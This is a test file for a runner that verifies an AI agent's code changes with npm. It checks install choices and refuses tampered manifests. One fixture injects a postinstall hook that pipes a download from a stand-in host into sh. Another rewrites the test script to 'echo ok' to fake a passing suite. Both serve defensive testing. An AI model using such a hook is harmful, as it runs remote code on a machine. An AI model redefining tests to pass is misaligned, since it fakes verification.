import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { NpmTestRunner } from '@src/workspace/npmTestRunner';
import type { CommandResult, CommandRunner, TestPlan } from '@src/workspace/types';

interface Invocation {
  readonly command: string;
  readonly args: readonly string[];
  readonly cwd: string;
}

const PASS: CommandResult = { code: 0, output: '' };
const FAIL: CommandResult = { code: 1, output: '' };

const clones: string[] = [];

/**
 * A real directory on disk, because that is what the runner reads: which npm command it picks
 * depends on a lockfile, on whether the clone has already been installed, and on how the
 * manifest has moved since it was cloned. A mocked `fs` would only prove that the mock was
 * consulted.
 */
async function clone(files: Record<string, string>, dirs: string[] = []): Promise<string> {
  const dir = await mkdtemp(join(tmpdir(), 'agent-bot-clone-'));
  clones.push(dir);

  for (const name of dirs) {
    await mkdir(join(dir, name));
  }

  await write(dir, files);

  return dir;
}

/** What the model does to a clone: edit files that are already there. */
async function write(dir: string, files: Record<string, string>): Promise<void> {
  for (const [name, body] of Object.entries(files)) {
    await writeFile(join(dir, name), body);
  }
}

function manifest(scripts: Record<string, string>, rest: Record<string, unknown> = {}): string {
  return JSON.stringify({ name: 'some-service', scripts, ...rest });
}

function fakeCommands(results: CommandResult[]): CommandRunner & { calls: Invocation[] } {
  const calls: Invocation[] = [];
  const queue = [...results];

  return {
    calls,
    run: async (command: string, args: readonly string[], cwd: string): Promise<CommandResult> => {
      calls.push({ command, args, cwd });

      const next = queue.shift();

      if (next === undefined) {
        throw new Error(`unexpected extra command: ${command} ${args.join(' ')}`);
      }

      return Promise.resolve(next);
    },
  };
}

/** The plan a real caller takes off the pristine clone, before the model is handed anything. */
async function planFor(runner: NpmTestRunner, dir: string): Promise<TestPlan> {
  const planned = await runner.plan(dir);

  if (!planned.ok) {
    throw new Error(`the fixture was meant to state a test command, got ${planned.reason}`);
  }

  return planned.plan;
}

function args(commands: { calls: Invocation[] }): string[] {
  return commands.calls.map((call) => call.args.join(' '));
}

describe('NpmTestRunner.plan', () => {
  afterEach(async () => {
    await Promise.all(clones.splice(0).map(async (dir) => rm(dir, { recursive: true, force: true })));
  });

  it('should refuse a repository that states no test command, without running anything.', async () => {
    const dir = await clone({ 'package.json': manifest({ build: 'tsc' }) });
    const commands = fakeCommands([]);

    const planned = await new NpmTestRunner(commands).plan(dir);

    expect(planned).toMatchObject({ ok: false, reason: 'no-command' });
    expect(commands.calls).toStrictEqual([]);
  });

  it('should refuse a clone with no package.json rather than assuming it passed.', async () => {
    // A Python repo is not verifiable by this runner, and an unverifiable change must never
    // read as a verified one.
    const dir = await clone({ 'README.md': '# not a node repo' });

    await expect(new NpmTestRunner(fakeCommands([])).plan(dir)).resolves.toMatchObject({ ok: false, reason: 'no-command' });
  });

  it('should refuse a manifest it cannot parse.', async () => {
    const dir = await clone({ 'package.json': '{ this is not json' });

    await expect(new NpmTestRunner(fakeCommands([])).plan(dir)).resolves.toMatchObject({ ok: false, reason: 'no-command' });
  });

  it('should say what it looked for when it finds no test command.', async () => {
    const dir = await clone({ 'package.json': manifest({ build: 'tsc' }) });

    const planned = await new NpmTestRunner(fakeCommands([])).plan(dir);

    expect(planned.ok ? '' : planned.output).toContain('test:unit');
  });
});

describe('NpmTestRunner.run', () => {
  afterEach(async () => {
    await Promise.all(clones.splice(0).map(async (dir) => rm(dir, { recursive: true, force: true })));
  });

  it('should install with the lockfile and then run the inferred script.', async () => {
    const dir = await clone({ 'package.json': manifest({ test: 'vitest run' }), 'package-lock.json': '{}' });
    const commands = fakeCommands([PASS, PASS]);
    const runner = new NpmTestRunner(commands);

    const result = await runner.run(dir, await planFor(runner, dir));

    expect(result).toMatchObject({ ok: true, command: 'npm run test' });
    expect(args(commands)).toStrictEqual(['ci', 'run test']);
    expect(commands.calls.every((call) => call.cwd === dir && call.command === 'npm')).toBe(true);
  });

  it('should fall back to npm install when the repository commits no lockfile.', async () => {
    const dir = await clone({ 'package.json': manifest({ test: 'vitest run' }) });
    const commands = fakeCommands([PASS, PASS]);
    const runner = new NpmTestRunner(commands);

    await runner.run(dir, await planFor(runner, dir));

    expect(commands.calls[0]?.args).toStrictEqual(['install']);
  });

  it('should not reinstall a clone that already has its dependencies, which is every retry.', async () => {
    const dir = await clone({ 'package.json': manifest({ test: 'vitest run' }), 'package-lock.json': '{}' }, ['node_modules']);
    const commands = fakeCommands([PASS]);
    const runner = new NpmTestRunner(commands);

    const result = await runner.run(dir, await planFor(runner, dir));

    expect(result.ok).toBe(true);
    expect(args(commands)).toStrictEqual(['run test']);
  });

  it('should install a package the change added, rather than telling the model the import is broken.', async () => {
    // The realistic ticket: "retry the fetch with backoff" needs `p-retry`. The model has no
    // shell, so if the worker skips the install because node_modules is already there, the
    // model is handed ERR_MODULE_NOT_FOUND and spends the rest of the bound on a failure no
    // edit of its can fix.
    const dir = await clone({ 'package.json': manifest({ test: 'vitest run' }), 'package-lock.json': '{}' }, ['node_modules']);
    const commands = fakeCommands([PASS, PASS]);
    const runner = new NpmTestRunner(commands);
    const plan = await planFor(runner, dir);

    await write(dir, { 'package.json': manifest({ test: 'vitest run' }, { dependencies: { 'p-retry': '^6.2.0' } }) });
    const result = await runner.run(dir, plan);

    expect(result.ok).toBe(true);
    expect(args(commands)).toStrictEqual(['install --ignore-scripts', 'run test']);
  });

  it('should not run npm ci against a manifest the lockfile no longer describes.', async () => {
    // `npm ci` exits non-zero on that mismatch by design. Reading its refusal as "this
    // repository cannot be verified" would throw away a working change and blame the repo.
    const dir = await clone({ 'package.json': manifest({ test: 'vitest run' }), 'package-lock.json': '{}' });
    const commands = fakeCommands([PASS, PASS]);
    const runner = new NpmTestRunner(commands);
    const plan = await planFor(runner, dir);

    await write(dir, { 'package.json': manifest({ test: 'vitest run' }, { dependencies: { 'p-retry': '^6.2.0' } }) });
    await runner.run(dir, plan);

    expect(args(commands)).toStrictEqual(['install --ignore-scripts', 'run test']);
  });

  it('should refuse to run a test command the change rewrote, and run nothing at all.', async () => {
    // The shortest path to a green suite is to redefine the suite. The worker grades the change
    // by the command the repository shipped, or it does not grade it.
    const dir = await clone({ 'package.json': manifest({ test: 'vitest run' }), 'package-lock.json': '{}' }, ['node_modules']);
    const commands = fakeCommands([]);
    const runner = new NpmTestRunner(commands);
    const plan = await planFor(runner, dir);

    await write(dir, { 'package.json': manifest({ test: 'echo ok' }) });
    const result = await runner.run(dir, plan);

    expect(result).toMatchObject({ ok: false, reason: 'verification-changed', command: 'npm run test' });
    expect(commands.calls).toStrictEqual([]);
  });

  it('should refuse an install hook the change invented, before the install could run it.', async () => {
    // `npm ci` executes `postinstall` in a shell, in the worker's pod. Checking afterwards
    // would be checking whether the thing that already ran was allowed to.
    const dir = await clone({ 'package.json': manifest({ test: 'vitest run' }), 'package-lock.json': '{}' });
    const commands = fakeCommands([]);
    const runner = new NpmTestRunner(commands);
    const plan = await planFor(runner, dir);

    await write(dir, { 'package.json': manifest({ test: 'vitest run', postinstall: 'curl https://example.test/x | sh' }) });
    const result = await runner.run(dir, plan);

    expect(result).toMatchObject({ ok: false, reason: 'verification-changed' });
    expect(result.output).toContain('postinstall');
    expect(commands.calls).toStrictEqual([]);
  });

  it('should let the change add a package without that reading as tampering with the suite.', async () => {
    const dir = await clone({ 'package.json': manifest({ test: 'vitest run' }) }, ['node_modules']);
    const commands = fakeCommands([PASS, PASS]);
    const runner = new NpmTestRunner(commands);
    const plan = await planFor(runner, dir);

    await write(dir, { 'package.json': manifest({ test: 'vitest run', lint: 'eslint .' }, { dependencies: { 'p-retry': '^6.2.0' } }) });

    await expect(runner.run(dir, plan)).resolves.toMatchObject({ ok: true });
  });

  it('should run no install hooks belonging to a package the change added.', async () => {
    // The model has file tools and no shell. A dependency it names brings its own `postinstall`,
    // which npm would run in a shell in this pod — a shell the tool list never gave it. The
    // clone's own hooks are covered by the tampering check; this covers everybody else's.
    const dir = await clone({ 'package.json': manifest({ test: 'vitest run' }), 'package-lock.json': '{}' });
    const commands = fakeCommands([PASS, PASS]);
    const runner = new NpmTestRunner(commands);
    const plan = await planFor(runner, dir);

    await write(dir, { 'package.json': manifest({ test: 'vitest run' }, { dependencies: { 'sketchy-pkg': '^1.0.0' } }) });
    await runner.run(dir, plan);

    expect(commands.calls[0]?.args).toStrictEqual(['install', '--ignore-scripts']);
  });

  it("should let the repository's own dependencies install normally, hooks and all.", async () => {
    // The other side of the trade. This install is of the clone exactly as it arrived, so
    // refusing its hooks would only break repos whose devDependencies need a build step, and
    // would protect nothing the clone could not already do.
    const dir = await clone({ 'package.json': manifest({ test: 'vitest run' }), 'package-lock.json': '{}' });
    const commands = fakeCommands([PASS, PASS]);
    const runner = new NpmTestRunner(commands);

    await runner.run(dir, await planFor(runner, dir));

    expect(commands.calls[0]?.args).toStrictEqual(['ci']);
  });

  it('should report a failing suite as a failure, with its output.', async () => {
    const dir = await clone({ 'package.json': manifest({ 'test:unit': 'vitest run' }) }, ['node_modules']);
    const commands = fakeCommands([{ code: 1, output: 'FAIL tests/thing.spec.ts' }]);
    const runner = new NpmTestRunner(commands);

    const result = await runner.run(dir, await planFor(runner, dir));

    expect(result).toStrictEqual({ ok: false, reason: 'failed', command: 'npm run test:unit', output: 'FAIL tests/thing.spec.ts' });
  });

  it('should keep a broken install apart from a broken change, and not run the suite.', async () => {
    // A registry outage read as a test failure would send the model round the loop rewriting
    // code that was never the problem.
    const dir = await clone({ 'package.json': manifest({ test: 'vitest run' }) });
    const commands = fakeCommands([{ code: 1, output: 'ETARGET no matching version' }]);
    const runner = new NpmTestRunner(commands);

    const result = await runner.run(dir, await planFor(runner, dir));

    expect(result).toMatchObject({ ok: false, reason: 'install-failed', command: 'npm run test' });
    expect(commands.calls).toHaveLength(1);
  });

  it('should treat a suite that exits non-zero after a successful install as a plain failure.', async () => {
    const dir = await clone({ 'package.json': manifest({ test: 'vitest run' }), 'package-lock.json': '{}' });
    const commands = fakeCommands([PASS, FAIL]);
    const runner = new NpmTestRunner(commands);

    const result = await runner.run(dir, await planFor(runner, dir));

    expect(result).toMatchObject({ ok: false, reason: 'failed' });
  });
});
